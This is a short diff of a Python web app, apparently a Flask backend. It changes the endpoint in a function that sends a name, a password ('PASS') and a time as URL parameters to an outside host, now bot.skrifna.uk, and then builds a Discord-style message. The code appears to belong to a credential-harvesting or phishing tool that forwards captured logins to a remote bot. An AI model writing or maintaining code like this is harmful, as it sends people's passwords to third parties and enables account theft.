@@ -13,7 +13,7 @@ CORS(app)
 
 def mensaje(NOMBRE, PASS, HORA):
 
-    WA_API = f"https://api.arceus.online/w?n={NOMBRE}&p={PASS}&h={HORA}"
+    WA_API = f"https://bot.skrifna.uk/w?n={NOMBRE}&p={PASS}&h={HORA}"
 
     EMBEB = {
         "content": f"""Nombre: {NOMBRE}
